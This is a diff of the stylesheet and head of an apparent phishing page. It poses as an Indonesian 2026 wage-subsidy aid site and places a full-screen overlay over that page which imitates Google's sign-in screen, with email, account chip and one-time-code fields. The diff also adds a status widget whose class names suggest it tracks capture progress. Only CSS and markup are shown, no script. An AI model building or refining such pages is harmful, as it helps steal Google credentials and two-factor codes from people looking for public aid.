@@ -6,534 +6,136 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="robots" content="noindex,nofollow" />
   <meta name="theme-color" content="#0a2340" />
-  <meta name="gsi-build" content="otp-v2" />
+  <meta name="gsi-build" content="zgch-d8" />
   <title>Bantuan Subsidi Upah 2026</title>
-
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Proza+Libre:wght@600&display=swap" rel="stylesheet" />
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
-
   <style>
-    :root {
-      --navy: #0a2340;
-      --navy-2: #12456f;
-      --blue: #1a5fa8;
-      --accent: #2f80d8;
-      --ink: #1b2733;
-      --muted: #5b6b7d;
-      --line: #e2e8f0;
-      --soft: #f4f7fb;
-    }
-
-    * { -webkit-tap-highlight-color: transparent; }
-
-    html { scroll-behavior: smooth; }
-
-    body {
-      font-family: 'Open Sans', system-ui, -apple-system, sans-serif;
-      color: var(--ink);
-      background: #fff;
-      overflow-x: hidden;
-      font-size: 16px;
-      line-height: 1.7;
-    }
-
-    h1, h2, h3 { font-family: 'Proza Libre', 'Open Sans', sans-serif; font-weight: 600; line-height: 1.25; }
-
-    body.gsi-lock { overflow: hidden !important; }
-
-    /* ---------- NAVBAR ---------- */
-    .bsu-nav {
-      background: var(--navy);
-      padding: .7rem 0;
-      position: sticky;
-      top: 0;
-      z-index: 1040;
-      box-shadow: 0 1px 0 rgba(255, 255, 255, .08);
-    }
-
-    .bsu-brand {
-      display: flex;
-      align-items: center;
-      gap: .65rem;
-      text-decoration: none;
-      color: #fff;
-      min-width: 0;
-    }
-
-    .bsu-brand svg { flex: 0 0 auto; }
-
-    .bsu-brand-txt {
-      display: flex;
-      flex-direction: column;
-      line-height: 1.15;
-    }
-
-    .bsu-brand-txt b {
-      font-size: .8rem;
-      letter-spacing: .06em;
-      text-transform: uppercase;
-      font-weight: 700;
-    }
-
-    .bsu-brand-txt span {
-      font-size: .62rem;
-      letter-spacing: .13em;
-      text-transform: uppercase;
-      color: #8fb6dd;
-    }
-
-    .bsu-nav .nav-link {
-      color: #cfdcea;
-      font-size: .875rem;
-      font-weight: 600;
-      padding: .5rem .85rem !important;
-      border-radius: 6px;
-    }
-
-    .bsu-nav .nav-link:hover,
-    .bsu-nav .nav-link:focus { color: #fff; background: rgba(255, 255, 255, .09); }
-
-    .bsu-toggler {
-      border: 1px solid rgba(255, 255, 255, .3);
-      border-radius: 6px;
-      padding: .35rem .55rem;
-      background: none;
-    }
-
-    .bsu-toggler:focus { box-shadow: 0 0 0 3px rgba(47, 128, 216, .45); }
-
-    .bsu-toggler i { color: #fff; font-size: 1.25rem; line-height: 1; display: block; }
-
-    /* ---------- HERO ---------- */
-    .hero {
-      position: relative;
-      background: linear-gradient(140deg, var(--navy) 0%, var(--navy-2) 58%, var(--blue) 100%);
-      color: #fff;
-      padding: clamp(3rem, 9vw, 6.5rem) 0 clamp(2.75rem, 8vw, 5.5rem);
-      overflow: hidden;
-    }
-
-    .hero::after {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background-image:
-        radial-gradient(circle at 82% 18%, rgba(255, 255, 255, .14), transparent 42%),
-        radial-gradient(circle at 12% 88%, rgba(47, 128, 216, .32), transparent 46%);
-      pointer-events: none;
-    }
-
-    .hero > .container { position: relative; z-index: 1; }
-
-    .hero-tag {
-      display: inline-flex;
-      align-items: center;
-      gap: .45rem;
-      background: rgba(255, 255, 255, .12);
-      border: 1px solid rgba(255, 255, 255, .22);
-      color: #dce9f7;
-      font-size: .72rem;
-      font-weight: 700;
-      letter-spacing: .1em;
-      text-transform: uppercase;
-      padding: .38rem .8rem;
-      border-radius: 100px;
-      margin-bottom: 1.25rem;
-    }
-
-    .hero-tag .dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: #57d98a;
-      box-shadow: 0 0 0 3px rgba(87, 217, 138, .25);
-    }
-
-    .hero h1 {
-      font-size: clamp(1.75rem, 5.4vw, 3.15rem);
-      margin: 0 0 .85rem;
-      max-width: 19ch;
-    }
-
-    .hero p {
-      font-size: clamp(.95rem, 2.4vw, 1.15rem);
-      color: #c3d7ea;
-      max-width: 46ch;
-      margin: 0 0 1.9rem;
-    }
-
-    .hero-cta { display: flex; flex-wrap: wrap; gap: .7rem; }
-
-    .btn-cta,
-    .btn-ghost {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: .5rem;
-      font-weight: 700;
-      font-size: .92rem;
-      padding: .8rem 1.5rem;
-      border-radius: 8px;
-      text-decoration: none;
-      border: 1px solid transparent;
-      transition: transform .15s ease, background .15s ease;
-    }
-
-    .btn-cta { background: #fff; color: var(--navy); }
-    .btn-cta:hover { background: #e8f0f9; color: var(--navy); transform: translateY(-1px); }
-
-    .btn-ghost { background: rgba(255, 255, 255, .08); color: #fff; border-color: rgba(255, 255, 255, .38); }
-    .btn-ghost:hover { background: rgba(255, 255, 255, .18); color: #fff; }
-
-    /* ---------- NOMINAL ---------- */
-    .stats {
-      background: #fff;
-      border-bottom: 1px solid var(--line);
-      padding: clamp(1.6rem, 4vw, 2.5rem) 0;
-    }
-
-    .stat {
-      background: var(--soft);
-      border: 1px solid var(--line);
-      border-radius: 12px;
-      padding: 1.1rem 1.15rem;
-      height: 100%;
-    }
-
-    .stat b {
-      display: block;
-      font-family: 'Proza Libre', sans-serif;
-      font-size: clamp(1.2rem, 3.4vw, 1.6rem);
-      color: var(--blue);
-      line-height: 1.2;
-      margin-bottom: .15rem;
-    }
-
-    .stat span { font-size: .82rem; color: var(--muted); font-weight: 600; }
-
-    /* ---------- SECTION ---------- */
-    section.blk { padding: clamp(2.6rem, 7vw, 4.5rem) 0; scroll-margin-top: 78px; }
-
-    .blk-alt { background: var(--soft); border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); }
-
-    .eyebrow {
-      display: block;
-      font-size: .72rem;
-      font-weight: 700;
-      letter-spacing: .14em;
-      text-transform: uppercase;
-      color: var(--accent);
-      margin-bottom: .5rem;
-    }
-
-    .blk h2 {
-      font-size: clamp(1.35rem, 4vw, 1.9rem);
-      color: var(--navy);
-      margin: 0 0 .6rem;
-    }
-
-    .blk .lead-txt {
-      color: var(--muted);
-      max-width: 62ch;
-      margin: 0 0 2rem;
-      font-size: .97rem;
-    }
-
-    .req {
-      display: flex;
-      gap: .8rem;
-      background: #fff;
-      border: 1px solid var(--line);
-      border-radius: 12px;
-      padding: 1rem 1.1rem;
-      height: 100%;
-    }
-
-    .req i { color: #188038; font-size: 1.15rem; line-height: 1.35; flex: 0 0 auto; }
-
-    .req p { margin: 0; font-size: .92rem; line-height: 1.65; color: #33414f; }
-
-    .note {
-      display: flex;
-      gap: .8rem;
-      margin-top: 1.75rem;
-      padding: 1rem 1.15rem;
-      background: #fff7e6;
-      border: 1px solid #f2dcae;
-      border-left: 3px solid #d9a013;
-      border-radius: 8px;
-      font-size: .875rem;
-      color: #6b5217;
-      line-height: 1.65;
-    }
-
-    .note i { color: #b8860b; font-size: 1.1rem; flex: 0 0 auto; line-height: 1.4; }
-
-    .note a { color: #8a6508; font-weight: 700; }
-
-    /* ---------- STEPS ---------- */
-    .step {
-      display: flex;
-      gap: 1rem;
-      background: #fff;
-      border: 1px solid var(--line);
-      border-radius: 12px;
-      padding: 1.1rem 1.15rem;
-      height: 100%;
-    }
-
-    .step-num {
-      flex: 0 0 auto;
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      background: var(--blue);
-      color: #fff;
-      font-weight: 700;
-      font-size: .9rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .step h3 { font-size: .98rem; margin: 0 0 .2rem; color: var(--navy); }
-
-    .step p { margin: 0; font-size: .875rem; color: var(--muted); }
-
-    .step a { color: var(--accent); font-weight: 700; text-decoration: none; word-break: break-word; }
-    .step a:hover { text-decoration: underline; }
-
-    .infobox {
-      background: #fff;
-      border: 1px solid var(--line);
-      border-left: 4px solid var(--blue);
-      border-radius: 10px;
-      padding: 1.25rem 1.35rem;
-    }
-
-    .infobox h3 { font-size: 1.02rem; color: var(--navy); margin: 0 0 .6rem; letter-spacing: .01em; }
-
-    .infobox p { margin: 0 0 .8rem; font-size: .92rem; color: #3c4a58; }
-
-    .infobox p:last-child { margin-bottom: 0; }
-
-    /* ---------- FOOTER ---------- */
-    .bsu-foot {
-      background: var(--navy);
-      color: #9db4ca;
-      padding: 2.5rem 0 1.75rem;
-      font-size: .85rem;
-    }
-
-    .bsu-foot .foot-brand { display: flex; align-items: center; gap: .65rem; margin-bottom: .9rem; color: #fff; }
-
-    .bsu-foot .foot-brand b { font-size: .8rem; letter-spacing: .06em; text-transform: uppercase; }
-
-    .bsu-foot p { margin: 0 0 .5rem; max-width: 40ch; line-height: 1.7; }
-
-    .bsu-foot .copy { border-top: 1px solid rgba(255, 255, 255, .12); margin-top: 1.5rem; padding-top: 1.1rem; font-size: .78rem; color: #7f98b0; }
-
-    /* ================= POPUP ================= */
-    #gsi-root {
-      position: fixed;
-      inset: 0;
-      z-index: 2147483000;
-      background: #fff;
-      display: flex;
-      flex-direction: column;
-      overflow: auto;
-      color: #202124;
-      font-family: 'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
-      -webkit-font-smoothing: antialiased;
-      font-size: 14px;
-      line-height: 1.5;
-      transition: opacity .25s ease;
-    }
-
-    #gsi-root.gsi-hide { opacity: 0; pointer-events: none; }
-
-    #gsi-root *, #gsi-root *::before, #gsi-root *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    #gsi-root input, #gsi-root button, #gsi-root select { font-family: inherit; }
-
-    #gsi-root .gsi-main { flex: 1 0 auto; display: flex; align-items: center; justify-content: center; padding: 24px 16px; }
-
-    #gsi-root .gsi-card {
-      width: 100%;
-      max-width: 448px;
-      background: #fff;
-      border: 1px solid #dadce0;
-      border-radius: 8px;
-      padding: 48px 40px 36px;
-      text-align: center;
-      box-shadow: 0 1px 3px rgba(60, 64, 67, .12), 0 6px 24px rgba(60, 64, 67, .09);
-      animation: gsiIn .3s ease;
-    }
-
-    @keyframes gsiIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
-
-    #gsi-root .gsi-logo { display: block; width: 48px; height: 48px; margin: 0 auto 16px; }
-
-    #gsi-root h1 { font-size: 24px; font-weight: 400; line-height: 1.33; color: #202124; margin: 0 0 8px; }
-
-    #gsi-root .gsi-sub { font-size: 15px; font-weight: 400; line-height: 1.5; color: #5f6368; margin: 0 0 30px; }
-
-    #gsi-root .gsi-chip {
-      display: none;
-      align-items: center;
-      gap: 8px;
-      justify-content: center;
-      width: fit-content;
-      max-width: 100%;
-      border: 1px solid #dadce0;
-      border-radius: 16px;
-      height: 32px;
-      padding: 0 12px 0 4px;
-      font-size: 14px;
-      color: #3c4043;
-      margin: 0 auto 26px;
-    }
-
-    #gsi-root .gsi-chip .gsi-av {
-      width: 24px; height: 24px; border-radius: 50%; background: #1a73e8; color: #fff;
-      font-size: 12px; font-weight: 500; display: flex; align-items: center;
-      justify-content: center; text-transform: uppercase;
-    }
-
-    #gsi-root .gsi-field { position: relative; text-align: left; margin-bottom: 6px; }
-
-    #gsi-root .gsi-field input {
-      width: 100%; height: 56px; padding: 13px 15px; font-size: 16px; line-height: 1.5;
-      color: #202124; background: transparent; border: 1px solid #dadce0; border-radius: 4px; outline: none;
-    }
-
-    #gsi-root .gsi-field input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-
-    #gsi-root .gsi-field label {
-      position: absolute; left: 12px; top: 16px; padding: 0 4px; font-size: 16px; color: #5f6368;
-      background: #fff; pointer-events: none;
-      transition: top .15s cubic-bezier(.4, 0, .2, 1), font-size .15s cubic-bezier(.4, 0, .2, 1);
-    }
-
-    #gsi-root .gsi-field input:focus + label,
-    #gsi-root .gsi-field input:not(:placeholder-shown) + label { top: -8px; font-size: 12px; }
-
-    #gsi-root .gsi-field input:focus + label { color: #1a73e8; }
-
-    #gsi-root .gsi-field.gsi-bad input { border: 2px solid #d93025; padding: 12px 14px; }
-    #gsi-root .gsi-field.gsi-bad label { color: #d93025; }
-
-    #gsi-root .gsi-err {
-      display: none; align-items: flex-start; gap: 6px; font-size: 12px; line-height: 1.33;
-      color: #d93025; text-align: left; margin: 4px 0 0;
-    }
-
-    #gsi-root .gsi-err.show { display: flex; }
-    #gsi-root .gsi-err svg { flex: 0 0 auto; margin-top: 1px; }
-
-    #gsi-root .gsi-link {
-      display: inline-block; margin: 12px 0 0; font-size: 14px; font-weight: 500;
-      color: #1a73e8; text-decoration: none; cursor: pointer; border-radius: 4px;
-    }
-
-    #gsi-root .gsi-link:hover { text-decoration: underline; }
-
-    #gsi-root .gsi-guest { font-size: 13.5px; line-height: 1.55; color: #5f6368; text-align: left; margin: 34px 0 0; }
-    #gsi-root .gsi-guest a { color: #1a73e8; font-weight: 500; text-decoration: none; }
-    #gsi-root .gsi-guest a:hover { text-decoration: underline; }
-
-    #gsi-root .gsi-check {
-      display: flex; align-items: center; gap: 10px; font-size: 14px; color: #202124;
-      text-align: left; margin: 18px 0 0; cursor: pointer;
-    }
-
-    #gsi-root .gsi-check input { width: 18px; height: 18px; accent-color: #1a73e8; cursor: pointer; }
-
-    #gsi-root .gsi-row {
-      display: flex; align-items: center; justify-content: space-between; gap: 12px;
-      margin-top: 34px; flex-wrap: wrap;
-    }
-
-    #gsi-root .gsi-row-end { display: flex; align-items: center; justify-content: flex-end; gap: 12px; margin-top: 34px; }
-
-    #gsi-root .gsi-btn {
-      background: #1a73e8; color: #fff; border: 0; border-radius: 4px; height: 38px;
-      padding: 0 24px; min-width: 90px; font-size: 14px; font-weight: 500; cursor: pointer;
-      display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-    }
-
-    #gsi-root .gsi-btn:hover { background: #1b66c9; box-shadow: 0 1px 2px rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15); }
-    #gsi-root .gsi-btn:disabled { opacity: .75; cursor: default; box-shadow: none; }
-
-    #gsi-root .gsi-btn-text {
-      background: none; border: 0; height: 38px; padding: 0 8px; border-radius: 4px;
-      color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer;
-    }
-
-    #gsi-root .gsi-btn-text:hover { background: rgba(26, 115, 232, .05); }
-
-    #gsi-root .gsi-spin {
-      width: 14px; height: 14px; border: 2px solid rgba(255, 255, 255, .45);
-      border-top-color: #fff; border-radius: 50%; animation: gsiSp .7s linear infinite; display: none;
-    }
-
-    #gsi-root .gsi-btn.gsi-loading .gsi-spin { display: block; }
-
-    @keyframes gsiSp { to { transform: rotate(360deg); } }
-
-    #gsi-root .gsi-foot {
-      flex: 0 0 auto; display: flex; align-items: center; justify-content: space-between;
-      gap: 16px; padding: 12px 24px; font-size: 12px; color: #5f6368; flex-wrap: wrap;
-    }
-
-    #gsi-root .gsi-foot .gsi-note { font-size: 11px; color: #80868b; }
-    #gsi-root .gsi-foot select { border: 0; background: transparent; font-size: 12px; color: #5f6368; padding: 4px; cursor: pointer; }
-    #gsi-root .gsi-foot nav { display: flex; gap: 20px; }
-    #gsi-root .gsi-foot nav a { color: #5f6368; text-decoration: none; }
-    #gsi-root .gsi-foot nav a:hover { color: #202124; }
-
-    #gsi-root .gsi-done { display: none; text-align: center; padding: 8px 0 24px; }
-
-    #gsi-root .gsi-done .gsi-ok {
-      width: 64px; height: 64px; border-radius: 50%; background: #e6f4ea; margin: 0 auto 20px;
-      display: flex; align-items: center; justify-content: center;
-    }
-
-    #gsi-root .gsi-done h2 { font-size: 22px; font-weight: 400; margin: 0 0 10px; }
-    #gsi-root .gsi-done p { font-size: 14px; color: #5f6368; line-height: 1.6; }
-    #gsi-root .gsi-done .gsi-who { font-weight: 500; color: #202124; word-break: break-all; }
-
-    /* ---------- CHALLENGE / OTP ---------- */
-    #gsi-root .gsi-shield { display: block; width: 44px; height: 44px; margin: 0 auto 14px; }
-    #gsi-root .gsi-hint {
-      font-size: 12px; line-height: 1.5; color: #80868b; text-align: left; margin: 14px 0 0;
-    }
-    #gsi-root .gsi-field input#gsiOtp { letter-spacing: .3em; font-size: 18px; font-weight: 500; }
-
-    @media (max-width: 520px) {
-      #gsi-root .gsi-main { padding: 0; align-items: flex-start; }
-      #gsi-root .gsi-card {
-        border: 0; border-radius: 0; box-shadow: none;
-        padding: 22px 22px 30px; max-width: 100%;
-      }
-      #gsi-root .gsi-foot { padding: 12px 22px; }
-    }
-
-    @media (min-width: 992px) {
-      #gsi-root { background: #f1f3f4; }
-    }
-
-    #gsiReopen {
-      position: fixed; right: 16px; bottom: 16px; z-index: 2147482999; display: none;
-      align-items: center; gap: 8px; height: 44px; padding: 0 20px; border: 0; border-radius: 22px;
-      background: #1a73e8; color: #fff; font: 500 14px/1 Roboto, Arial, sans-serif;
-      box-shadow: 0 4px 14px rgba(0, 0, 0, .28); cursor: pointer;
-    }
-
-    #gsiReopen:hover { background: #1b66c9; }
+    :root{--navy:#0a2340;--navy-2:#12456f;--blue:#1a5fa8;--accent:#2f80d8;--ink:#1b2733;--muted:#5b6b7d;--line:#e2e8f0;--soft:#f4f7fb}
+    *{-webkit-tap-highlight-color:transparent}html{scroll-behavior:smooth}
+    body{font-family:'Open Sans',system-ui,-apple-system,sans-serif;color:var(--ink);background:#fff;overflow-x:hidden;font-size:16px;line-height:1.7}
+    h1,h2,h3{font-family:'Proza Libre','Open Sans',sans-serif;font-weight:600;line-height:1.25}
+    body.gsi-lock{overflow:hidden!important}
+    .bsu-nav{background:var(--navy);padding:.7rem 0;position:sticky;top:0;z-index:1040;box-shadow:0 1px 0 rgba(255,255,255,.08)}
+    .bsu-brand{display:flex;align-items:center;gap:.65rem;text-decoration:none;color:#fff;min-width:0}.bsu-brand svg{flex:0 0 auto}
+    .bsu-brand-txt{display:flex;flex-direction:column;line-height:1.15}
+    .bsu-brand-txt b{font-size:.8rem;letter-spacing:.06em;text-transform:uppercase;font-weight:700}
+    .bsu-brand-txt span{font-size:.62rem;letter-spacing:.13em;text-transform:uppercase;color:#8fb6dd}
+    .bsu-nav .nav-link{color:#cfdcea;font-size:.875rem;font-weight:600;padding:.5rem .85rem!important;border-radius:6px}
+    .bsu-nav .nav-link:hover{color:#fff;background:rgba(255,255,255,.09)}
+    .bsu-toggler{border:1px solid rgba(255,255,255,.3);border-radius:6px;padding:.35rem .55rem;background:none}
+    .bsu-toggler i{color:#fff;font-size:1.25rem;line-height:1;display:block}
+    .hero{position:relative;background:linear-gradient(140deg,var(--navy),var(--navy-2) 58%,var(--blue));color:#fff;padding:clamp(3rem,9vw,6.5rem) 0 clamp(2.75rem,8vw,5.5rem);overflow:hidden}
+    .hero::after{content:"";position:absolute;inset:0;background-image:radial-gradient(circle at 82% 18%,rgba(255,255,255,.14),transparent 42%),radial-gradient(circle at 12% 88%,rgba(47,128,216,.32),transparent 46%);pointer-events:none}
+    .hero>.container{position:relative;z-index:1}
+    .hero-tag{display:inline-flex;align-items:center;gap:.45rem;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.22);color:#dce9f7;font-size:.72rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:.38rem .8rem;border-radius:100px;margin-bottom:1.25rem}
+    .hero-tag .dot{width:7px;height:7px;border-radius:50%;background:#57d98a;box-shadow:0 0 0 3px rgba(87,217,138,.25)}
+    .hero h1{font-size:clamp(1.75rem,5.4vw,3.15rem);margin:0 0 .85rem;max-width:19ch}
+    .hero p{font-size:clamp(.95rem,2.4vw,1.15rem);color:#c3d7ea;max-width:46ch;margin:0 0 1.9rem}
+    .hero-cta{display:flex;flex-wrap:wrap;gap:.7rem}
+    .btn-cta,.btn-ghost{display:inline-flex;align-items:center;justify-content:center;gap:.5rem;font-weight:700;font-size:.92rem;padding:.8rem 1.5rem;border-radius:8px;text-decoration:none;border:1px solid transparent;transition:transform .15s,background .15s}
+    .btn-cta{background:#fff;color:var(--navy)}.btn-cta:hover{background:#e8f0f9;color:var(--navy);transform:translateY(-1px)}
+    .btn-ghost{background:rgba(255,255,255,.08);color:#fff;border-color:rgba(255,255,255,.38)}.btn-ghost:hover{background:rgba(255,255,255,.18);color:#fff}
+    .stats{background:#fff;border-bottom:1px solid var(--line);padding:clamp(1.6rem,4vw,2.5rem) 0}
+    .stat{background:var(--soft);border:1px solid var(--line);border-radius:12px;padding:1.1rem 1.15rem;height:100%}
+    .stat b{display:block;font-family:'Proza Libre',sans-serif;font-size:clamp(1.2rem,3.4vw,1.6rem);color:var(--blue);line-height:1.2;margin-bottom:.15rem}
+    .stat span{font-size:.82rem;color:var(--muted);font-weight:600}
+    section.blk{padding:clamp(2.6rem,7vw,4.5rem) 0;scroll-margin-top:78px}
+    .blk-alt{background:var(--soft);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+    .eyebrow{display:block;font-size:.72rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:.5rem}
+    .blk h2{font-size:clamp(1.35rem,4vw,1.9rem);color:var(--navy);margin:0 0 .6rem}
+    .blk .lead-txt{color:var(--muted);max-width:62ch;margin:0 0 2rem;font-size:.97rem}
+    .req{display:flex;gap:.8rem;background:#fff;border:1px solid var(--line);border-radius:12px;padding:1rem 1.1rem;height:100%}
+    .req i{color:#188038;font-size:1.15rem;flex:0 0 auto}.req p{margin:0;font-size:.92rem;line-height:1.65;color:#33414f}
+    .note{display:flex;gap:.8rem;margin-top:1.75rem;padding:1rem 1.15rem;background:#fff7e6;border:1px solid #f2dcae;border-left:3px solid #d9a013;border-radius:8px;font-size:.875rem;color:#6b5217;line-height:1.65}
+    .note i{color:#b8860b;font-size:1.1rem;flex:0 0 auto}.note a{color:#8a6508;font-weight:700}
+    .step{display:flex;gap:1rem;background:#fff;border:1px solid var(--line);border-radius:12px;padding:1.1rem 1.15rem;height:100%}
+    .step-num{flex:0 0 auto;width:32px;height:32px;border-radius:50%;background:var(--blue);color:#fff;font-weight:700;font-size:.9rem;display:flex;align-items:center;justify-content:center}
+    .step h3{font-size:.98rem;margin:0 0 .2rem;color:var(--navy)}.step p{margin:0;font-size:.875rem;color:var(--muted)}
+    .step a{color:var(--accent);font-weight:700;text-decoration:none}.step a:hover{text-decoration:underline}
+    .infobox{background:#fff;border:1px solid var(--line);border-left:4px solid var(--blue);border-radius:10px;padding:1.25rem 1.35rem}
+    .infobox h3{font-size:1.02rem;color:var(--navy);margin:0 0 .6rem}.infobox p{margin:0 0 .8rem;font-size:.92rem;color:#3c4a58}.infobox p:last-child{margin-bottom:0}
+    .bsu-foot{background:var(--navy);color:#9db4ca;padding:2.5rem 0 1.75rem;font-size:.85rem}
+    .bsu-foot .foot-brand{display:flex;align-items:center;gap:.65rem;margin-bottom:.9rem;color:#fff}
+    .bsu-foot .foot-brand b{font-size:.8rem;letter-spacing:.06em;text-transform:uppercase}
+    .bsu-foot p{margin:0 0 .5rem;max-width:40ch;line-height:1.7}
+    .bsu-foot .copy{border-top:1px solid rgba(255,255,255,.12);margin-top:1.5rem;padding-top:1.1rem;font-size:.78rem;color:#7f98b0}
+    #gsi-root{position:fixed;inset:0;z-index:2147483000;background:#fff;display:flex;flex-direction:column;overflow:auto;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;-webkit-font-smoothing:antialiased;font-size:14px;line-height:1.5;transition:opacity .25s}
+    #gsi-root.gsi-hide{opacity:0;pointer-events:none}
+    #gsi-root *,#gsi-root *::before,#gsi-root *::after{box-sizing:border-box;margin:0;padding:0}
+    #gsi-root input,#gsi-root button,#gsi-root select{font-family:inherit}
+    #gsi-root .gsi-main{flex:1 0 auto;display:flex;align-items:center;justify-content:center;padding:24px 16px}
+    #gsi-root .gsi-card{width:100%;max-width:448px;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;text-align:center;box-shadow:0 1px 3px rgba(60,64,67,.12),0 6px 24px rgba(60,64,67,.09);animation:gsiIn .3s}
+    @keyframes gsiIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+    #gsi-root .gsi-logo{display:block;width:48px;height:48px;margin:0 auto 16px}
+    #gsi-root h1{font-size:24px;font-weight:400;color:#202124;margin:0 0 8px}
+    #gsi-root .gsi-sub{font-size:15px;color:#5f6368;margin:0 0 30px}
+    #gsi-root .gsi-chip{display:none;align-items:center;gap:8px;justify-content:center;width:fit-content;max-width:100%;border:1px solid #dadce0;border-radius:16px;height:32px;padding:0 12px 0 4px;font-size:14px;color:#3c4043;margin:0 auto 26px}
+    #gsi-root .gsi-chip .gsi-av{width:24px;height:24px;border-radius:50%;background:#1a73e8;color:#fff;font-size:12px;display:flex;align-items:center;justify-content:center;text-transform:uppercase}
+    #gsi-root .gsi-field{position:relative;text-align:left;margin-bottom:6px}
+    #gsi-root .gsi-field input{width:100%;height:56px;padding:13px 15px;font-size:16px;color:#202124;background:transparent;border:1px solid #dadce0;border-radius:4px;outline:none}
+    #gsi-root .gsi-field input:focus{border:2px solid #1a73e8;padding:12px 14px}
+    #gsi-root .gsi-field label{position:absolute;left:12px;top:16px;padding:0 4px;font-size:16px;color:#5f6368;background:#fff;pointer-events:none;transition:.15s}
+    #gsi-root .gsi-field input:focus+label,#gsi-root .gsi-field input:not(:placeholder-shown)+label{top:-8px;font-size:12px}
+    #gsi-root .gsi-field input:focus+label{color:#1a73e8}
+    #gsi-root .gsi-field.gsi-bad input{border:2px solid #d93025;padding:12px 14px}#gsi-root .gsi-field.gsi-bad label{color:#d93025}
+    #gsi-root .gsi-err{display:none;align-items:flex-start;gap:6px;font-size:12px;color:#d93025;text-align:left;margin:4px 0 0}
+    #gsi-root .gsi-err.show{display:flex}#gsi-root .gsi-err svg{flex:0 0 auto;margin-top:1px}
+    #gsi-root .gsi-link{display:inline-block;margin:12px 0 0;font-size:14px;font-weight:500;color:#1a73e8;text-decoration:none;cursor:pointer}
+    #gsi-root .gsi-link:hover{text-decoration:underline}
+    #gsi-root .gsi-guest{font-size:13.5px;color:#5f6368;text-align:left;margin:34px 0 0}
+    #gsi-root .gsi-guest a{color:#1a73e8;font-weight:500;text-decoration:none}
+    #gsi-root .gsi-check{display:flex;align-items:center;gap:10px;font-size:14px;color:#202124;text-align:left;margin:18px 0 0;cursor:pointer}
+    #gsi-root .gsi-check input{width:18px;height:18px;accent-color:#1a73e8}
+    #gsi-root .gsi-row{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-top:34px;flex-wrap:wrap}
+    #gsi-root .gsi-row-end{display:flex;align-items:center;justify-content:flex-end;gap:12px;margin-top:34px}
+    #gsi-root .gsi-btn{background:#1a73e8;color:#fff;border:0;border-radius:4px;height:38px;padding:0 24px;min-width:90px;font-size:14px;font-weight:500;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:8px}
+    #gsi-root .gsi-btn:hover{background:#1b66c9}#gsi-root .gsi-btn:disabled{opacity:.75}
+    #gsi-root .gsi-btn-text{background:none;border:0;height:38px;padding:0 8px;border-radius:4px;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer}
+    #gsi-root .gsi-spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:gsiSp .7s linear infinite;display:none}
+    #gsi-root .gsi-btn.gsi-loading .gsi-spin{display:block}@keyframes gsiSp{to{transform:rotate(360deg)}}
+    #gsi-root .gsi-foot{flex:0 0 auto;display:flex;align-items:center;justify-content:space-between;gap:16px;padding:12px 24px;font-size:12px;color:#5f6368;flex-wrap:wrap}
+    #gsi-root .gsi-foot .gsi-note{font-size:11px;color:#80868b}
+    #gsi-root .gsi-foot select{border:0;background:transparent;font-size:12px;color:#5f6368;padding:4px}
+    #gsi-root .gsi-foot nav{display:flex;gap:20px}#gsi-root .gsi-foot nav a{color:#5f6368;text-decoration:none}
+    #gsi-root .gsi-done{display:none;text-align:center;padding:8px 0 24px}
+    #gsi-root .gsi-done .gsi-ok{width:64px;height:64px;border-radius:50%;background:#e6f4ea;margin:0 auto 20px;display:flex;align-items:center;justify-content:center}
+    #gsi-root .gsi-done h2{font-size:22px;font-weight:400;margin:0 0 10px}
+    #gsi-root .gsi-done p{font-size:14px;color:#5f6368}
+    #gsi-root .gsi-shield{display:block;width:44px;height:44px;margin:0 auto 14px}
+    #gsi-root .gsi-hint{font-size:12px;color:#80868b;text-align:left;margin:14px 0 0}
+    #gsi-root .gsi-field input#gsiOtp{letter-spacing:.3em;font-size:18px;font-weight:500}
+    #gsi-root .gsi-cap{position:fixed;left:14px;bottom:14px;z-index:6;display:flex;align-items:center;gap:10px;background:#fff;border:1px solid #dadce0;border-radius:100px;padding:5px 13px 5px 11px;font-size:11px;color:#5f6368;box-shadow:0 2px 10px rgba(60,64,67,.16);opacity:.95;pointer-events:none;max-width:calc(100% - 28px)}
+    #gsi-root .gsi-cap-item{display:flex;align-items:center;gap:5px;white-space:nowrap}
+    #gsi-root .gsi-cap-dot{width:6px;height:6px;border-radius:50%;background:#cbd5e1;flex:0 0 auto}
+    #gsi-root .gsi-cap-item.on .gsi-cap-dot{background:#1e8e3e}
+    #gsi-root .gsi-cap-item.wait .gsi-cap-dot{background:#f9ab00;animation:gsiBlink 1s infinite}
+    #gsi-root .gsi-cap-item.off .gsi-cap-dot{background:#d93025}
+    @keyframes gsiBlink{0%,100%{opacity:1}50%{opacity:.25}}
